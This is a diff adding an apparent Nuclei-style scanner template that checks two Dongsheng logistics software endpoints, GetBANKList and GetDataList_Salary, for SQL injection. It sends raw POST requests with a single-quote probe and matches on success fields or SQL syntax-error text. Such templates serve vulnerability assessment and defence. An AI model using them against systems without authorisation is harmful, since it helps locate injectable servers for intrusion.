@@ -1,0 +1,57 @@
+id: dongshengsoft-GetBANKList-and-GetDataList_Salary-sqli
+info:
+  name: 东胜物流 sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%20GetBANKList%20SQL%E6%B3%A8%E5%85%A5.txt
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%20GetDataList_Salary%20SQL%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: dongshengsoft,sqli
+
+http:
+  - raw:
+      - |
+        POST /MvcShipping/MsBaseInfo/GetBANKList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 456
+
+        strCondition=1'
+        
+    matchers:
+      - type: dsl
+        name: GetBANKList
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Success','GID','CODENAME')
+        condition: and
+
+  - raw:
+      - |
+        POST /TruckMng/MsWlDriver/GetDataList_Salary?_dc=1665626804091&start=0&limit=30&sort=&condition=1*&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 448
+
+        strCwSTARTGID=1'
+        
+    matchers:
+      - type: dsl
+        name: GetDataList_Salary
+        dsl:
+          - status_code == 500
+          - contains_all(body,'order','语法错误')
+        condition: and
